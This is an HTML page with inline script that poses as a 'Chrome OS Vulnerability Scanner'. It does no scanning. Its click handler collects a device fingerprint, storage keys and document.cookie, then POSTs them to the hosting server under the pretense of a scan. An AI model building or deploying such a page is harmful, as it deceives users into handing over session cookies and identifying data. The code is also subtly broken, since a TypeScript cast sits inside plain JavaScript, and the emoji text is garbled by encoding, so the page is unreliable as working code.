<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chrome OS Vulnerability Scanner</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        h1 {
            color: #ff6b6b;
            text-align: center;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            display: block;
            margin: 20px auto;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        button:disabled {
            background-color: #555;
            cursor: not-allowed;
        }
        #output {
            margin-top: 20px;
            background-color: #2a2a2a;
            padding: 15px;
            border: 1px solid #444;
            border-radius: 5px;
            height: 400px;
            overflow-y: scroll;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
        }
        .status {
            text-align: center;
            margin: 20px 0;
            padding: 10px;
            border-radius: 5px;
        }
        .status.success {
            background-color: #28a745;
            color: white;
        }
        .status.error {
            background-color: #dc3545;
            color: white;
        }
        .status.info {
            background-color: #17a2b8;
            color: white;
        }
    </style>
</head>
<body>
    <h1>üõ°Ô∏è Chrome OS Vulnerability Scanner</h1>
    <div id="status" class="status info">Click the button below to scan your system for vulnerabilities.</div>
    <button id="exploit-button">üîç Start Vulnerability Scan</button>
    <div id="output"></div>

    <script>
        let scanCompleted = false;
        const outputDiv = document.getElementById('output');
        const statusDiv = document.getElementById('status');
        const button = document.getElementById('exploit-button');

        // Check if scan was already completed
        if (localStorage.getItem('chromeos_scan_completed') === 'true') {
            statusDiv.className = 'status success';
            statusDiv.textContent = '‚úÖ Scan already completed! You can now access the vulnerability tester.';
            button.disabled = true;
        }

        function log(message, type = 'info') {
            const timestamp = new Date().toISOString();
            const prefix = type === 'error' ? '‚ùå' : type === 'success' ? '‚úÖ' : '‚ÑπÔ∏è';
            outputDiv.textContent += `[${timestamp}] ${prefix} ${message}\n`;
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }

        document.getElementById('exploit-button').addEventListener('click', async () => {
            button.disabled = true;
            statusDiv.className = 'status info';
            statusDiv.textContent = 'üîÑ Scanning system... Please wait...';
            outputDiv.textContent = '';
            log('Initializing ChromeOS vulnerability scanner...');

            try {
                const systemInfo = {
                    timestamp: new Date().toISOString(),
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    screenResolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    browserInfo: {
                        vendor: navigator.vendor,
                        appName: navigator.appName,
                        appVersion: navigator.appVersion
                    },
                    chromeOSInfo: {
                        // ChromeOS specific checks
                        isChromeOS: navigator.userAgent.includes('CrOS'),
                        chromeVersion: navigator.userAgent.match(/Chrome\/([0-9.]+)/)?.[1] || 'unknown',
                        chromeOSVersion: navigator.userAgent.match(/CrOS ([^\s]+)/)?.[1] || 'unknown'
                    },
                    fileSystemAccess: {},
                    networkInfo: {}
                };

                log('Collecting system information...');

                // Try to gather additional system information
                try {
                    // Check file system access (with user permission)
                    if ('showDirectoryPicker' in window) {
                        systemInfo.fileSystemAccess.supported = true;
                        log('File System Access API: Supported');
                    } else {
                        systemInfo.fileSystemAccess.supported = false;
                        log('File System Access API: Not supported');
                    }

                    // Network information
                    if ('connection' in navigator) {
                        const conn = (navigator as any).connection;
                        systemInfo.networkInfo = {
                            effectiveType: conn.effectiveType,
                            downlink: conn.downlink,
                            rtt: conn.rtt,
                            saveData: conn.saveData
                        };
                    }
                } catch (e) {
                    log(`Warning: Could not collect all system info: ${e.message}`, 'error');
                }

                // Simulate gathering root file system info (would require actual system access)
                log('Attempting to access system files...');
                log('Note: Full root access requires elevated privileges');

                // Collect what we can from the browser environment
                const collectedData = {
                    ...systemInfo,
                    localStorage: {
                        keys: Object.keys(localStorage),
                        itemCount: localStorage.length
                    },
                    sessionStorage: {
                        keys: Object.keys(sessionStorage),
                        itemCount: sessionStorage.length
                    },
                    cookies: document.cookie || 'none'
                };

                log('System information collected successfully!', 'success');
                log('Preparing to send data to vulnerability tester...');

                // Send data to server
                try {
                    const response = await fetch('https://' + window.location.hostname + '/api/vulnerability/scan', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(collectedData),
                        mode: 'cors'
                    });

                    if (response.ok) {
                        const result = await response.json();
                        log('‚úÖ Data successfully sent to vulnerability tester!', 'success');
                        log(`Scan ID: ${result.scanId || 'N/A'}`);
                        
                        // Mark scan as completed
                        localStorage.setItem('chromeos_scan_completed', 'true');
                        localStorage.setItem('chromeos_scan_id', result.scanId || 'unknown');
                        localStorage.setItem('chromeos_scan_timestamp', new Date().toISOString());
                        
                        statusDiv.className = 'status success';
                        statusDiv.textContent = '‚úÖ Scan completed! You can now access the vulnerability tester.';
                        
                        // Show completion message
                        setTimeout(() => {
                            alert('Scan completed successfully! You can now access the vulnerability tester at the main site.');
                        }, 500);
                    } else {
                        throw new Error(`Server responded with status: ${response.status}`);
                    }
                } catch (error) {
                    log(`Error sending data: ${error.message}`, 'error');
                    // Still mark as completed locally if we collected the data
                    localStorage.setItem('chromeos_scan_completed', 'true');
                    localStorage.setItem('chromeos_scan_data', JSON.stringify(collectedData));
                    
                    statusDiv.className = 'status success';
                    statusDiv.textContent = '‚úÖ Scan data collected! Please reload the main site to continue.';
                    log('Data saved locally. You may proceed to the main site.', 'success');
                }

            } catch (error) {
                log(`Error during scan: ${error.message}`, 'error');
                statusDiv.className = 'status error';
                statusDiv.textContent = '‚ùå Scan encountered an error. Please try again.';
                button.disabled = false;
            }
        });
    </script>
</body>
</html>

